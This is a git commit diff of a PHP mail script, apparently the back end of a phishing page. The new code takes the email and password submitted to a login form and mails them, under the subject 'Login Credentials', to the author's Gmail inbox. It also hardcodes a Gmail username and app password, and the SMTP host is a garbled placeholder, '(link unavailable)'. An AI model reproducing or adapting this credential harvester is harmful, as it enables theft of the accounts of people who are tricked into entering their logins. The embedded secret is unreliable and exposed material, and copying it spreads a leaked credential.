7152dc98e420fac86e797137912ca37c9a60902a
happylomas <prince56ebere@gmail.com>
2024-06-10 20:00:18 -0500

    oldnew_sendphp

--- phplink/send.php
+++ phplink/send.php
@@ -1,11 +1,16 @@
 <?php
+// Validate user input
+if (!filter_var($_POST["email"], FILTER_VALIDATE_EMAIL)) {
+    echo "Invalid email";
+    exit;
+}
 
-// Declare virables
-$email = $_POST["email"];
-$password = $_POST["password"];
+if (empty($_POST["password"])) {
+    echo "Password cannot be empty";
+    exit;
+}
 
-//Import PHPMailer classes into the global namespace
-//These must be at the top of your script, not inside a function
+// Import PHPMailer classes
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\SMTP;
 use PHPMailer\PHPMailer\Exception;
@@ -14,35 +19,26 @@ require './phpmailer/src/Exception.php';
 require './phpmailer/src/PHPMailer.php';
 require './phpmailer/src/SMTP.php';
 
-//Create an instance; passing `true` enables exceptions
 $mail = new PHPMailer(true);
 
 try {
-    //Server settings
-    // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
-    $mail->isSMTP();                                            //Send using SMTP
-    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
-    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
-    $mail->Username   = 'prince.ebere56@gmail.com';                     //SMTP username
-    $mail->Password   = 'jlbh ehqo zbpx isoi';                               //SMTP password
-    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
-    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
+    // Server settings
+    $mail->isSMTP();
+    $mail->Host = '(link unavailable)';
+    $mail->SMTPAuth = true;
+    $mail->Username = 'prince.ebere56@gmail.com';
+    $mail->Password = 'jlbhehqozbpxisoi';
+    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
+    $mail->Port = 465;
 
-    //Recipients
-    $mail->setFrom('$email', '$name');
-    $mail->addAddress('prince.ebere56@gmail.com');     //Add a recipient
-    // $mail->addAddress('ellen@example.com');               //Name is optional
-    // $mail->addReplyTo('info@example.com', 'Information');
-    // $mail->addCC('cc@example.com');
-    // $mail->addBCC('bcc@example.com');
+    // Recipients
+    $mail->setFrom($_POST["email"], $_POST["name"]);
+    $mail->addAddress('prince.ebere56@gmail.com');
 
-
-
-    //Content
-    $mail->isHTML(true);                                  //Set email format to HTML
-    $mail->Email = '$email';
-    $mail->Password = '$password';
-    // $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
+    // Content
+    $mail->isHTML(true);
+    $mail->Subject = "Login Credentials";
+    $mail->Body = "Email: " . $_POST["email"] . "<br>Password: " . $_POST["password"];
 
     $mail->send();
     echo 'Message has been sent';
